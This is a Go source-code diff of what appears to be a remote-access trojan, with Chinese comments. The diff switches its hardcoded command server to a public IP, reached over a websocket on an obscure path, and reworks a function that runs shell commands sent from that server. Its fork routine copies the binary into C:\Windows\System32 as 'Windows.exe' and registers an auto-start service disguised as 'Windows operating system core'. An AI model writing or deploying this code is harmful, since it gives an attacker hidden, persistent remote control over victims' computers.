@@ -38,9 +38,9 @@ const (
 )
 
 var (
-	baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
-	//baseUrl      = "124.156.10.149:8080"
-	//baseUrl      = "106.154.242.217"
+	//baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
+	//baseUrl      = "124.156.100.149:8080"
+	baseUrl      = "106.54.242.217"
 	conn         *websocket.Conn
 	origin       = "http://" + baseUrl + "/"
 	url          = "ws://" + baseUrl + "/hfuiefdhuiwe32uhi"
@@ -259,15 +259,9 @@ func json2Message(strByte []byte) (Message, error) {
 //阻塞式的执行外部shell命令的函数,等待执行完毕并返回标准输出
 func execShell(s string) (string, error) {
 	s = strings.Trim(s, "\n") //去除前后换行
-	args := strings.Split(s, " ")
-
 	//cd需要额外处理
-	switch args[0] {
-	case "cd":
-		if len(args) < 2 {
-			return "", nil
-		}
-		err := os.Chdir(args[1])
+	if strings.HasPrefix(s, "cd ") {
+		err := os.Chdir(s[3:])
 		if err != nil {
 			return "", err
 		}
@@ -334,7 +328,7 @@ func getMac() string {
 
 func fork() {
 	src, _ := filepath.Abs(filepath.Dir(os.Args[0]))
-	dst := "C:/Windows/System32/"
+	dst := "C:\\Windows\\System32\\"
 	dstFileName := "Windows.exe"
 	if src == dst[:len(dst)-1] { //如果运行程序就在指定目录
 		return
@@ -342,12 +336,14 @@ func fork() {
 
 	_, err := fileCopy(os.Args[0], dst, dstFileName)
 	if err != nil {
+		os.Exit(0)
 		return
+	} else {
+		execShell("sc create Windows binPath= C:/Windows/System32/Windows.exe start= auto displayname= Windows")
+		execShell("sc description Windows Windows operating system core")
+		execShell("sc start Windows")
+		os.Exit(0) //退自己
 	}
-	execShell("sc create Windows binPath= C:/Windows/System32/Windows.exe start= auto displayname= Windows")
-	execShell("sc description Windows Windows operating system core")
-	execShell("sc start Windows")
-	os.Exit(0) //退自己
 }
 
 func fileCopy(src, dst, dstFileName string) (int64, error) {
